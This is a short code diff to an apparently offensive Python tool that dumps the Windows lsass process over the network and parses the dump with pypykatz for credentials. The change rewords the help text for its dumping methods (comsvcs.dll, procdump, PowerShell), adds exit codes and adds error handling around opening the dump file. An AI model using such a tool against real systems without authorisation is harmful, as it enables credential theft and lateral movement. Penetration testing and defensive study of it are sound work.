@@ -53,7 +53,7 @@ def run():
     group_extract = parser.add_argument_group('remote parsing only')
     group_extract.add_argument('--dumppath', action='store', help='lsass dump path (Format : c$/Temp/lsass.dmp)')
     parser.add_argument('-m', '--method', action='store', default="1", help='''Dumping method
-    0: Try all methods to dump procdump, stop on success (Requires -p if dll method fails)
+    0: Try all methods (dll then procdump) to dump lsass, stop on success (Requires -p if dll method fails)
     1: comsvcs.dll method, stop on success (default)
     2: Procdump method, stop on success (Requires -p)
     3: comsvcs.dll + Powershell method, stop on success
@@ -84,11 +84,16 @@ def run():
         file_path = dumper.dump()
         if not file_path:
             logger.error("lsass could not be dumped")
-            exit()
+            exit(1)
         logger.success("Process lsass.exe is being dumped")
 
     ifile = ImpacketFile(logger)
-    ifile.open(conn, file_path)
+    try:
+        ifile.open(conn, file_path)
+    except Exception as e:
+        logger.error("lsass dump file does not exist. Use --debug flag and open an issue")
+        logger.debug("Error : {}".format(str(e)))
+        exit(2)
     dumpfile = pypykatz.parse_minidump_external(ifile)
     ifile.close()
     parser = Parser(dumpfile, logger)
